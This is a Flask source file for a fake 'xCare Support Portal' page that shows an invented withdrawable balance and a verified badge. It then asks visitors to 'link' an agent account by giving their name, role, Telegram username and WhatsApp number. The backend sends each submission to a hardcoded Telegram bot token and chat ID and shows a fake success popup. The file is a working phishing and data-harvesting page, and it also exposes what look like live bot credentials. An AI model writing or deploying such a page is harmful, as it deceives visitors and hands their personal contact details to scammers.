from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# টেলিগ্রাম বট কনফিগ (নিরাপদভাবে রাখা হয়েছে)
B_P1 = "8540257283"
B_P2 = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
BOT_TOKEN = f"{B_P1}:{B_P2}"
CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Support Portal</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b162c; color: white; margin: 0; padding: 0; }
            .top-bar { display: flex; justify-content: space-between; padding: 10px 15px; font-size: 11px; color: #4caf50; background: #0b162c; }
            .balance-card { background: linear-gradient(135deg, #0d47a1, #1976d2); margin: 15px; padding: 25px; border-radius: 15px; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
            .balance-card small { font-size: 10px; opacity: 0.8; letter-spacing: 1px; }
            .balance-card h2 { margin: 5px 0; font-size: 28px; }
            .status-tag { background: rgba(255,255,255,0.1); padding: 4px 10px; border-radius: 20px; font-size: 10px; display: inline-block; margin-top: 5px; }
            
            .main-container { padding: 0 15px; }
            .section-title { font-size: 12px; color: #1976d2; font-weight: bold; margin-bottom: 15px; display: flex; align-items: center; }
            .section-title i { margin-right: 8px; }
            
            .form-container { background: #162641; padding: 20px; border-radius: 15px; border: 1px solid #1c2e4a; margin-bottom: 20px; }
            .input-group { margin-bottom: 18px; }
            .input-group label { display: block; font-size: 12px; color: #8fa3bf; margin-bottom: 8px; }
            .input-group input, .input-group select { width: 100%; padding: 14px; background: #0b162c; border: 1px solid #253959; border-radius: 10px; color: white; box-sizing: border-box; font-size: 14px; outline: none; }
            .input-group input:focus { border-color: #1976d2; }
            
            .submit-btn { background: #007bff; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.3s; box-shadow: 0 4px 15px rgba(0,123,255,0.3); }
            .submit-btn:active { transform: scale(0.98); }
            
            #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 1000; justify-content: center; align-items: center; }
            .popup-box { background: #162641; padding: 40px; border-radius: 20px; text-align: center; width: 80%; border: 1px solid #1976d2; }
        </style>
    </head>
    <body>
        <div class="top-bar">
            <span>● Gateway Status: Online</span>
            <span style="color: #8fa3bf;">ID: 1XB-7729-MS</span>
        </div>

        <div class="balance-card">
            <small>TOTAL WITHDRAWABLE BALANCE</small>
            <h2>৳ 5,450.00 BDT</h2>
            <div class="status-tag">✔ Account Verified</div>
        </div>

        <div class="main-container">
            <div class="section-title">👤 PARTNER/AGENT VERIFICATION</div>
            
            <div class="form-container">
                <form id="agentForm">
                    <div class="input-group">
                        <label>Select Role</label>
                        <select name="role">
                            <option>Affiliate Manager</option>
                            <option>Master Agent</option>
                            <option>Sub Agent</option>
                        </select>
                    </div>
                    <div class="input-group">
                        <label>Full Name</label>
                        <input type="text" name="name" placeholder="Enter Full Name" required>
                    </div>
                    <div class="input-group">
                        <label>Telegram Username</label>
                        <input type="text" name="tg_user" placeholder="@username" required>
                    </div>
                    <div class="input-group">
                        <label>WhatsApp Number</label>
                        <input type="text" name="phone" placeholder="01XXXXXXXXX" required>
                    </div>
                    <button type="submit" class="submit-btn" id="subBtn">LINK ACCOUNT</button>
                </form>
            </div>
        </div>

        <div id="success-popup">
            <div class="popup-box">
                <div style="font-size: 60px; color: #4caf50;">✔</div>
                <h3 style="margin: 15px 0;">Success!</h3>
                <p style="color: #8fa3bf; font-size: 14px;">Your verification request is being processed. We will contact you soon.</p>
                <button class="submit-btn" style="margin-top: 20px;" onclick="window.location.reload()">OK</button>
            </div>
        </div>

        <script>
            document.getElementById('agentForm').onsubmit = async (e) => {
                e.preventDefault();
                const btn = document.getElementById('subBtn');
                btn.innerText = 'PROCCESSING...';
                btn.disabled = true;

                const formData = Object.fromEntries(new FormData(e.target));
                
                try {
                    const response = await fetch('/api/verify', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(formData)
                    });

                    if(response.ok) {
                        document.getElementById('success-popup').style.display = 'flex';
                    }
                } catch (err) {
                    alert('Connection Error!');
                    btn.innerText = 'LINK ACCOUNT';
                    btn.disabled = false;
                }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json
    text = f"🛡️ **Verification Request**\n\n👤 Name: {d.get('name')}\n🎭 Role: {d.get('role')}\n🆔 TG: {d.get('tg_user')}\n📱 Phone: {d.get('phone')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": text, "parse_mode": "Markdown"})
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
